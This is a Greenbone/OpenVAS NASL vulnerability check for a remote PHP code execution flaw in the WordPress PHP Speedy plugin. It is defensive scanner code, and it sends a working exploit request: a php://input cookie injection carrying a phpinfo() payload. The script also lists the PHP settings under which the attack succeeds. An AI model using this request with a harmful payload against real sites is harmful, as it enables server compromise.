CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802008" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-03-22 08:43:18 +0100 (Tue, 22 Mar 2011)" );
	script_bugtraq_id( 46743 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WordPress PHP Speedy Plugin 'page' Parameter Remote PHP Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/43652/" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/65913" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/16273/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/98921" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute
  malicious PHP code to in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress PHP Speedy plugin version 0.5.2 and prior." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with WordPress PHP Speedy Plugin and is
  prone to remote PHP code execution vulnerability." );
	script_tag( name: "insight", value: "The flaws are caused by improper validation of user-supplied input
  via the 'page' parameter to '/wp-content/plugins/php_speedy_wp/libs/php_speedy/view
  /admin_container.php', which allows attackers to execute arbitrary PHP code in
  the context of an affected site.

  NOTE: Exploit will work properly when the following settings are configured within PHP:

  register_globals=On, allow_url_include=On and magic_quotes_gpc=Off" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
postData = "<?php phpinfo(); ?>";
url = dir + "/wp-content/plugins/php_speedy_wp/libs/php_speedy/view/admin_container.php";
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Cookie: page=php://input%00\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n\\r\\n", postData );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, ">phpinfo()<" ) && ContainsString( res, ">System <" ) && ContainsString( res, ">Configuration<" ) && ContainsString( res, ">PHP Core<" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
}

